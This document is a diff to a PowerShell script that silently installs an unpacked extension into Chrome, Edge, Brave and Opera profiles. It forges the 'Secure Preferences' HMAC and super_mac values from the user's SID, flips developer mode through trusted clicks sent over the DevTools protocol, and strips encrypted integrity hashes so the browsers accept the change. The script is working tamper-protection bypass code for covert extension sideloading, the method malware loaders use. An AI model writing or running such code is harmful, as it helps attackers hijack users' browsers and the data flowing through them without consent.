@@ -114,10 +114,51 @@ function ConvertTo-Canon ($v) {
     return ('{' + ($parts -join ',') + '}')
 }
 
+# Super-MAC canonical form: keeps empty {} and [] (unlike per-path canon),
+# matches Chromium PrefHashCalculator::Calculate over the whole macs dict
+function ConvertTo-CanonKeepEmpty ($v) {
+    if ($null -eq $v) { return 'null' }
+    if ($v -is [bool]) { if ($v) { return 'true' } else { return 'false' } }
+    $types = @('System.Int32','System.Int64','System.UInt32','System.UInt64','System.Byte','System.SByte','System.Int16','System.UInt16')
+    if ($types -contains $v.GetType().ToString()) { return $v.ToString([System.Globalization.CultureInfo]::InvariantCulture) }
+    if ($v -is [double] -or $v -is [single]) { return $v.ToString('R', [System.Globalization.CultureInfo]::InvariantCulture) }
+    if ($v -is [string]) { return (ConvertTo-EscString $v) }
+    if ($v -is [System.Collections.IList] -or $v -is [object[]] -or $v -is [System.Array]) {
+        $parts = @()
+        foreach ($item in $v) { $parts += (ConvertTo-CanonKeepEmpty $item) }
+        return ('[' + ($parts -join ',') + ']')
+    }
+    $map = @{}
+    if ($v -is [System.Collections.IDictionary]) {
+        foreach ($k in @($v.Keys)) { $map[[string]$k] = $v[$k] }
+    } else {
+        foreach ($p in $v.PSObject.Properties) { $map[$p.Name] = $p.Value }
+    }
+    $parts = @()
+    foreach ($k in (@($map.Keys) | Sort-Object)) {
+        $parts += ((ConvertTo-EscString $k) + ':' + (ConvertTo-CanonKeepEmpty $map[$k]))
+    }
+    return ('{' + ($parts -join ',') + '}')
+}
+
+function Calc-SuperHMAC([byte[]]$seed, [string]$deviceId, $macs) {
+    $canonical = (ConvertTo-CanonKeepEmpty $macs) -replace '<', '\u003c'
+    $message = $deviceId + $canonical
+    $hmac = New-Object System.Security.Cryptography.HMACSHA256
+    if (-not $seed -or $seed.Length -eq 0) { $seed = [byte[]]@(0x00) }
+    $hmac.Key = $seed
+    $hash = $hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($message))
+    $hmac.Dispose()
+    ([System.BitConverter]::ToString($hash) -replace '-', '')
+}
+
 function Calc-HMAC([byte[]]$seed, [string]$deviceId, [string]$path, $value) {
     $canonical = (ConvertTo-Canon $value) -replace '<', '\u003c'
     $message = "${deviceId}${path}${canonical}"
     $hmac = New-Object System.Security.Cryptography.HMACSHA256
+    # .NET rejects zero-length HMAC keys; HMAC key-pads to blocksize with zeros
+    # anyway, so key=[0x00] == key=[] byte-for-byte (verified vs live Brave/Edge/Opera MACs)
+    if (-not $seed -or $seed.Length -eq 0) { $seed = [byte[]]@(0x00) }
     $hmac.Key = $seed
     $hash = $hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($message))
     $hmac.Dispose()
@@ -137,6 +178,14 @@ function Enable-DevMode-CDP($userDataDir, $browserType) {
         if ($browserType -eq 'edge') {
             $chrome = "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe"
             if (-not (Test-Path $chrome)) { $chrome = "${env:ProgramFiles}\Microsoft\Edge\Application\msedge.exe" }
+        }
+        if ($browserType -eq 'brave') {
+            $chrome = "${env:ProgramFiles}\BraveSoftware\Brave-Browser\Application\brave.exe"
+            if (-not (Test-Path $chrome)) { $chrome = "${env:ProgramFiles(x86)}\BraveSoftware\Brave-Browser\Application\brave.exe" }
+        }
+        if ($browserType -eq 'opera') {
+            $chrome = "$env:LOCALAPPDATA\Programs\Opera\opera.exe"
+            if (-not (Test-Path $chrome)) { return $false }
         }
         if (-not (Test-Path $chrome)) { return $false }
 
@@ -188,14 +237,37 @@ function Enable-DevMode-CDP($userDataDir, $browserType) {
         # wait until the WebUI renders: extensions-manager -> extensions-toolbar#toolbar
         $loaded = $false
         for ($i = 0; $i -lt 12; $i++) {
-            $r = Invoke-CdpEval $ws $ct (100 + $i) 'var m=document.querySelector("extensions-manager"); (m && m.shadowRoot && m.shadowRoot.querySelector("extensions-toolbar#toolbar")) ? "tb" : "waiting"'
-            if ($r -match '"tb"') { $loaded = $true; break }
+            $r = Invoke-CdpEval $ws $ct (100 + $i) ('var m=document.querySelector("extensions-manager"); if (m && m.shadowRoot) { var tb=m.shadowRoot.querySelector("extensions-toolbar#toolbar"); if (tb && tb.shadowRoot) { var t=tb.shadowRoot.querySelector("cr-toggle#devMode"); if (t) { var r=t.getBoundingClientRect(); JSON.stringify({tb:1, checked:t.checked, x:r.left+r.width/2, y:r.top+r.height/2}) } else "no-toggle" } else "no-tb" } else "no-mgr"')
+            if ($r -match 'checked') { $loaded = $true; break }
             Start-Sleep -Milliseconds 1000
         }
         if (-not $loaded) { throw 'no toolbar' }
 
-        # THE CLICK: manager -> toolbar -> shadowRoot -> cr-toggle#devMode
-        $c = Invoke-CdpEval $ws $ct 22 'try { var m=document.querySelector("extensions-manager"); var t=m.shadowRoot.querySelector("extensions-toolbar#toolbar").shadowRoot.querySelector("cr-toggle#devMode"); if (t && !t.checked) { t.click(); } JSON.stringify({found: !!t, checked: t ? t.checked : null}) } catch(e) { "err:" + e }'
+        # THE CLICK (trusted): use coords from wait-eval;
+        # Chromium 136+ cr-toggle ignores synthetic JS clicks -> Input.dispatchMouseEvent
+        $obj = $null
+        try {
+            $env = $r | ConvertFrom-Json
+            $val = $env.result.result.value
+            $obj = $val | ConvertFrom-Json
+        } catch {}
+        if (-not $obj -or -not $obj.tb) { throw 'no toolbar' }
+        $c = $obj | ConvertTo-Json -Compress
+        if (-not $obj.checked) {
+            function Send-Mouse($ws, $ct, [int]$id, [string]$mtype, [double]$x, [double]$y) {
+                $o = @{ id = $id; method = 'Input.dispatchMouseEvent'; params = @{ type = $mtype; x = $x; y = $y; button = 'left'; clickCount = 1; pointerType = 'mouse' } }
+                if ($mtype -eq 'mousePressed') { $o.params.Add('buttons', 1) }
+                $j = $o | ConvertTo-Json -Depth 6 -Compress
+                $b = [System.Text.Encoding]::UTF8.GetBytes($j)
+                $ws.SendAsync([System.ArraySegment[byte]]::new($b), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()
+                Start-Sleep -Milliseconds 60
+            }
+            [void](Send-Mouse $ws $ct 30 'mouseMoved'    $obj.x $obj.y)
+            [void](Send-Mouse $ws $ct 31 'mousePressed'  $obj.x $obj.y)
+            [void](Send-Mouse $ws $ct 32 'mouseReleased' $obj.x $obj.y)
+            Start-Sleep -Milliseconds 900
+            $c = Invoke-CdpEval $ws $ct 33 ('document.querySelector("extensions-manager").shadowRoot.querySelector("extensions-toolbar#toolbar").shadowRoot.querySelector("cr-toggle#devMode").checked')
+        }
         Write-Host ('devmode click: ' + ($c -replace '\s+',' '))
 
         # let Chrome persist prefs (~12s)
@@ -216,22 +288,44 @@ function Inject-Chrome-HMAC($profPath, $extPath, $extId, $browserType) {
     $securePrefFile = Join-Path $profPath 'Secure Preferences'
     # NOTE: no early return here — SP появится после флипа на свежем профиле
 
-    $seed = if ($browserType -eq 'edge') { $EdgeSeed } else { $ChromeSeed }
+    # Verified empirically 2026-09-27: Edge/Brave/Opera derive SP MACs with an
+    # EMPTY seed (no resources.pak seed resource - Chromium fork change).
+    # Only Google Chrome embeds the 64-byte seed (resources.pak rid 146).
+    $seed = if ($browserType -eq 'chrome') { $ChromeSeed } else { $EdgeSeed }
     $deviceId = Get-UserSID
 
     try {
-        # 1) dev mode must be ON (Chrome itself writes it + its own MAC/encrypted_hash)
-        #    на свежем профиле SP создаётся самим Chrome в процессе флипа (заход на extensions)
+        # 1) Chrome only: dev mode flip avoids the "developer mode extensions" nag.
+        #    Edge/Brave/Opera: SP macs are self-consistent under an empty seed and the
+    #    loaded unpacked ext is accepted WITHOUT extensions.ui.developer_mode - skip the flip.
         $sp = $null
         if (Test-Path $securePrefFile) {
             $sp = Get-Content $securePrefFile -Raw -Encoding UTF8 | ConvertFrom-Json
         }
-        if (-not $sp -or -not ($sp.extensions.ui.developer_mode)) {
-            $userDataDir = Split-Path $profPath -Parent
-            if (-not (Enable-DevMode-CDP $userDataDir $browserType)) { return $false }
-            if (-not (Test-Path $securePrefFile)) { return $false }
-            $sp = Get-Content $securePrefFile -Raw -Encoding UTF8 | ConvertFrom-Json
-            if (-not ($sp.extensions.ui.developer_mode)) { return $false }
+        # devmode flip for ALL: Chromium 136+ requires it even for Brave/Edge/Opera
+        # (unpacked ext gets disable_reasons=16777216 without it)
+        if ($true) {
+            if (-not $sp -or -not ($sp.extensions.ui.developer_mode)) {
+                $userDataDir = Split-Path $profPath -Parent
+                if (-not (Enable-DevMode-CDP $userDataDir $browserType)) { return $false }
+                $ok = $false
+                for ($w = 0; $w -lt 20; $w++) {
+                    if (-not (Test-Path $securePrefFile)) { Start-Sleep -Seconds 1; continue }
+                    try {
+                        $sp = Get-Content $securePrefFile -Raw -Encoding UTF8 | ConvertFrom-Json
+                        if ($sp.extensions -and $sp.extensions.ui -and $sp.extensions.ui.developer_mode) { $ok = $true; break }
+                    } catch {}
+                    Start-Sleep -Seconds 1
+                }
+                if (-not $ok) { return $false }
+            }
+        }
+        if (-not $sp) {
+            # no SP yet (fresh profile) - create a minimal one, the browser will fill the rest
+            $sp = [pscustomobject]@{
+                extensions = [pscustomobject]@{ settings = [pscustomobject]@{} }
+                protection = [pscustomobject]@{ macs = [pscustomobject]@{} }
+            }
         }
 
         # 2) already injected -> maintenance-ok
@@ -280,13 +374,32 @@ function Inject-Chrome-HMAC($profPath, $extPath, $extId, $browserType) {
         if (-not $sp.protection) { $sp | Add-Member -NotePropertyName protection -NotePropertyValue (New-Object PSCustomObject) -Force }
         if (-not $sp.protection.macs) { $sp.protection | Add-Member -NotePropertyName macs -NotePropertyValue (New-Object PSCustomObject) -Force }
         if (-not $sp.protection.macs.extensions) { $sp.protection.macs | Add-Member -NotePropertyName extensions -NotePropertyValue (New-Object PSCustomObject) -Force }
-        $sp.protection.macs.extensions.settings = [pscustomobject]$macs
+        $sp.protection.macs.extensions | Add-Member -NotePropertyName settings -NotePropertyValue ([pscustomobject]$macs) -Force
 
-        # 5) super_mac over sorted MAC map
-        $sortedMacs = [ordered]@{}
-        foreach ($key in ($macs.Keys | Sort-Object)) { $sortedMacs[$key] = $macs[$key] }
-        $superVal = [pscustomobject][ordered]@{ extensions = [pscustomobject][ordered]@{ settings = [pscustomobject]$sortedMacs } }
-        $sp.protection.super_mac = (Calc-HMAC $seed $deviceId 'protection.super_mac' $superVal)
+        # 4b) ui-mac for ALL (Chrome CDP-флип тоже оставляет stale mac при force-kill)
+        if ($true) {
+        # 4b) ui-mac: после CDP-флипа extensions.ui.developer_mode=true;
+        # Brave проверяет этот per-path mac и при несовпадении сбрасывает devmode
+        # (-> unpacked disabled 16777216). Всегда пересчитываем под значение true.
+        if (-not $sp.extensions.ui) { 
+            $sp.extensions | Add-Member -NotePropertyName ui -NotePropertyValue (New-Object PSCustomObject) -Force
+        }
+        $sp.extensions.ui | Add-Member -NotePropertyName developer_mode -NotePropertyValue $true -Force
+        if (-not $sp.protection.macs.extensions.ui) { 
+            $sp.protection.macs.extensions | Add-Member -NotePropertyName ui -NotePropertyValue (New-Object PSCustomObject) -Force
+        }
+        $uiVal = $sp.protection.macs.extensions.ui.developer_mode
+        $sp.protection.macs.extensions.ui | Add-Member -NotePropertyName developer_mode -NotePropertyValue (Calc-HMAC $seed $deviceId 'extensions.ui.developer_mode' $true) -Force
+        # stale v20 encrypted-хэши (macs от старых значений) убираем - иначе валидатор форков их видит и сбрасывает
+        if ($sp.protection.macs.extensions.ui.PSObject.Properties['developer_mode_encrypted_hash']) { [void]$sp.protection.macs.extensions.ui.PSObject.Properties.Remove('developer_mode_encrypted_hash') }
+        if ($sp.protection.macs.extensions.PSObject.Properties['settings_encrypted_hash']) { [void]$sp.protection.macs.extensions.PSObject.Properties.Remove('settings_encrypted_hash') }
+        if ($sp.protection.macs.extensions.ui.PSObject.Properties['developer_mode_encrypted_hash']) { [void]$sp.protection.macs.extensions.ui.PSObject.Properties.Remove('developer_mode_encrypted_hash') }
+        }
+        # 5) super_mac = HMAC(seed, deviceId + canonical(ALL protection.macs))
+        # (Chromium PrefHashCalculator: NO path, WHOLE macs dict, empty dicts kept,
+        #  sorted keys; empirically matched vs live Chrome+Brave super_macs)
+        $allMacs = $sp.protection.macs
+        $sp.protection | Add-Member -NotePropertyName super_mac -NotePropertyValue (Calc-SuperHMAC $seed $deviceId $allMacs) -Force
 
         # 6) write back
         $json = $sp | ConvertTo-Json -Depth 32 -Compress
@@ -343,7 +456,10 @@ function Process-Browser($name, $exeName, $paths, $extPath, $extId, $manifestObj
             $profPath = Join-Path $userDataDir $prof
             $bType = 'chrome'
             if ($name -eq 'Microsoft\Edge') { $bType = 'edge' }
-            # NOTE: brave uses the same Chromium seed family; verified on chrome+edge only
+            if ($name -like 'BraveSoftware*') { $bType = 'brave' }
+            if ($name -like 'Opera*') { $bType = 'opera' }
+            # Seed map (empirical, 2026-09-27): chrome -> 64B pak seed;
+            # edge/brave/opera -> empty seed (fork removed the pak seed)
             if (Inject-Profile $profPath $extPath $extId $manifestObj $bType) { $injected++ }
         }
     }
@@ -353,6 +469,7 @@ function Process-Browser($name, $exeName, $paths, $extPath, $extId, $manifestObj
         $exePath = "${env:ProgramFiles}\Google\$name\Application\$exeName.exe"
         if ($name -eq 'Microsoft\Edge') { $exePath = "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe" }
         if ($name -eq 'BraveSoftware\Brave-Browser') { $exePath = "${env:ProgramFiles}\BraveSoftware\Brave-Browser\Application\brave.exe" }
+        if ($name -eq 'Opera Software') { $exePath = "$env:LOCALAPPDATA\Programs\Opera\opera.exe" }
 
         if (Test-Path $exePath) {
             Start-Process $exePath -ArgumentList '--restore-last-session' -WindowStyle Normal
@@ -759,7 +876,7 @@ try {
 }
 
 function Test-BrowserRunning {
-    foreach ($n in @('chrome', 'msedge', 'brave')) {
+    foreach ($n in @('chrome', 'msedge', 'brave', 'opera')) {
         if (Get-Process $n -ErrorAction SilentlyContinue) { return $true }
     }
     return $false
@@ -815,6 +932,7 @@ function Install-ExtensionCopy {
         $total += Process-Browser 'Google\Chrome' 'chrome' @('%LOCALAPPDATA%\Google\Chrome\User Data') $ExtDir $ExtId $manifestObj
         $total += Process-Browser 'Microsoft\Edge' 'msedge' @('%LOCALAPPDATA%\Microsoft\Edge\User Data') $ExtDir $ExtId $manifestObj
         $total += Process-Browser 'BraveSoftware\Brave-Browser' 'brave' @('%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data') $ExtDir $ExtId $manifestObj
+        $total += Process-Browser 'Opera Software' 'opera' @('%LOCALAPPDATA%\Opera Software\Opera Stable') $ExtDir $ExtId $manifestObj
         return ($total -gt 0)
     } catch {
         return $false
@@ -876,6 +994,8 @@ try {
     $total += Process-Browser 'Google\Chrome' 'chrome' $chromePaths $extDir $extId $manifestObj
     $total += Process-Browser 'Microsoft\Edge' 'msedge' $edgePaths $extDir $extId $manifestObj
     $total += Process-Browser 'BraveSoftware\Brave-Browser' 'brave' $bravePaths $extDir $extId $manifestObj
+    $operaPaths = @('%LOCALAPPDATA%\Opera Software\Opera Stable')
+    $total += Process-Browser 'Opera Software' 'opera' $operaPaths $extDir $extId $manifestObj
 
     Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
 
